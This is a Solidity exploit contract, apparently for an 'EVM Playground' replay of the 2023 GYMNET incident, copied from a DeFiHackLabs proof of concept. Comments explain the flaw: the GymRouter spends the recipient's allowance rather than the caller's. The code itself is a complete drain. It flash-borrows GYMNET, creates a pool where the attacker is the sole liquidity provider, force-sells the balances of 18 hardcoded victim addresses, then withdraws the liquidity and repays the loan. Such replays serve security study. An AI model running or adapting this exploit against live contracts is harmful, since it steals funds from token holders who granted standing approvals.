// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-GYMNET).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (GYMTest IS the attacker contract: it implements `pancakeCall` directly
// and `testExploit()` is the entrypoint), so there is no separately-named
// standalone exploit contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack (testExploit -> run, pancakeCall,
// GYMNETTofakeUSDT) so the playground can deploy it and record run(). Logic
// and constants are copied verbatim from test/GYMNET_exp.sol.
//
// Root cause: the deployed GymRouter implementation (0x177DD7…, reached via
// the proxy's delegatecall) pulls the swap input token from the `to`
// (recipient) parameter instead of `msg.sender` inside
// swapExactTokensForTokensSupportingFeeOnTransferTokens(...). Because GymRouter
// is a shared spender that many GYMNET holders had already approve()'d, any
// caller can pass `to = victim` and force-sell the victim's entire GYMNET
// balance, spending the VICTIM's standing allowance rather than the caller's.
// The attacker routes every forced sell through a fresh GYMNET/fakeUSDT
// PancakeSwap pool where the attacker is the sole LP, so the victims' GYMNET
// piles up as pool reserve the attacker then reclaims via removeLiquidity.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function decimals() external view returns (uint8);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IPancakePairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouterV2 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
}

interface IGymRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to
    ) external;
}

contract GYMNETDrain {
    IERC20 constant GYMNET = IERC20(0x0012365F0a1E5F30a5046c680DCB21D07b15FcF7);
    IERC20 constant fakeUSDT = IERC20(0x2A1ee1278a8b64fd621B46e3ee9c08071cA3A8a5);
    // PancakeSwap V2: GYMNET-fakeUSDT
    IERC20 constant CakeLP = IERC20(0x8e1b75e6c43aEAf5055De07Ab4b76E356d7BB2db);
    IPancakePairV2 constant PancakePair = IPancakePairV2(0xf5D3cba24783586Db9e7F35188EC0747FfB55F9B);
    IPancakeRouterV2 constant PancakeRouter = IPancakeRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IGymRouter constant GymRouter = IGymRouter(0x6b869795937DD2B6F4E03d5A0Ffd07A8AD8c095B);

    // step 0: flash-borrow 1,010,000 GYMNET from the (different) GYMNET pair.
    // The non-empty `data` triggers the pancakeCall callback below, which does
    // the entire attack and repays the flash swap before this call returns.
    function run() external {
        PancakePair.swap(1_010_000 * 1e18, 0, address(this), new bytes(1));
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        GYMNET.approve(address(PancakeRouter), ~uint256(0));
        fakeUSDT.approve(address(PancakeRouter), ~uint256(0));
        CakeLP.approve(address(PancakeRouter), ~uint256(0));

        // Seed a brand-new GYMNET/fakeUSDT pool; the attacker becomes the
        // sole LP (this contract already holds 9,990,000 fakeUSDT, seeded via
        // the `setup` block, mirroring the test's `deal(fakeUSDT, this, ...)`).
        PancakeRouter.addLiquidity(
            address(GYMNET),
            address(fakeUSDT),
            GYMNET.balanceOf(address(this)),
            fakeUSDT.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp + 1000
        );

        address[] memory victims = new address[](18);
        victims[0] = 0x0C8bbd0629050b78C91F1AAfDCF04e90238B3568;
        victims[1] = 0xbDFcA747646975F3bb9dA26BD55DAf2168c40Fe7;
        victims[2] = 0x4AD478039bE7D1aD17C2eCBEb1029c29366c2789;
        victims[3] = 0x081c96340738e397111E010137E04E97fB444E74;
        victims[4] = 0xb611329241a51F84519BDc773E5E98F94e2D7491;
        victims[5] = 0x3720d2BbFC8Bd5d6D62c8bf71fFD33Ea20cbEAE5;
        victims[6] = 0x07E12a333B500a2f7048131400f0D216eb226F10;
        victims[7] = 0xe01edc2B47576bf4aEF9fa311B1f16961c634F76;
        victims[8] = 0x96346D0302E8640fbB165040B3d039bf10ce9565;
        victims[9] = 0x88c08aafFDd547EBa783c84c23b549B5222fFB56;
        victims[10] = 0x38B9a3Bd8693D59d38769A7CE8802632D1DB9D67;
        victims[11] = 0x0E1556F63B7d30D6d7966Cb7b194eA7A8F3C588a;
        victims[12] = 0x7E1d08f4960b3825eb3da2abbE3Cc849Ff53576c;
        victims[13] = 0xA4265EfFEeeeC7dbc5b323610ccD738E8A1aE298;
        victims[14] = 0xE62551B1385FD59C6A39224838Ba432B0F7735f2;
        victims[15] = 0xE52234Ed813EBFC625477B4626AB84Ea09A82556;
        victims[16] = 0x819B684fd18D0512EFC89c81aEAadFDdA61Fa7fC;
        victims[17] = 0xd6c382B2624293cEf5A43E30e12cc0e6b3DEd153;

        for (uint256 i; i < victims.length; ++i) {
            GYMNETTofakeUSDT(victims[i]);
        }

        // Attacker is the only LP -> reclaim the seed plus every forced sell.
        PancakeRouter.removeLiquidity(
            address(GYMNET), address(fakeUSDT), CakeLP.balanceOf(address(this)), 0, 0, address(this), block.timestamp + 1000
        );

        // Repay the flash loan (5% GYMNET sell-tax applies on this transfer).
        GYMNET.transfer(address(PancakePair), 1_043_936 * 1e18);
    }

    function GYMNETTofakeUSDT(address victim) internal {
        address[] memory path = new address[](2);
        path[0] = address(GYMNET);
        path[1] = address(fakeUSDT);
        uint256[] memory amounts = PancakeRouter.getAmountsOut(GYMNET.balanceOf(victim), path);
        uint256 amountOutMin = amounts[1] - (amounts[1] / 20);
        // The vulnerable router pulls the input from `to` (the victim), not
        // from msg.sender (this contract) -- spending the victim's own
        // standing allowance to GymRouter.
        GymRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            GYMNET.balanceOf(victim), amountOutMin, path, victim
        );
    }
}
